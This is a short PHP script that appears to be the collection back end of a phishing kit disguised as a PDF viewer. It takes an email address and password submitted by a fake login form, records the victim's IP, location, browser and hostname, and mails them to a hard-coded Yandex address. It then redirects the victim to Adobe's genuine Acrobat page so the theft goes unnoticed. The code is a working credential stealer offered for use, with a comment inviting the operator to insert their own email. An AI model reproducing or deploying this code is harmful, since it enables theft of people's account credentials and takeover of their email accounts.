<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------PDF Info-----------------------\n";
$message .= "Email ID            : ".$_POST['frm-email']."\n";
$message .= "Email password            : ".$_POST['frm-pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Passi-------------\n";
//change ur email here
$send = "emirate2kg@yandex.com";
$subject = "Result from $ip";
$headers = "From: Passi<electronic@army.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://acrobat.adobe.com/us/en/acrobat/pdf-reader.html");

	 
?>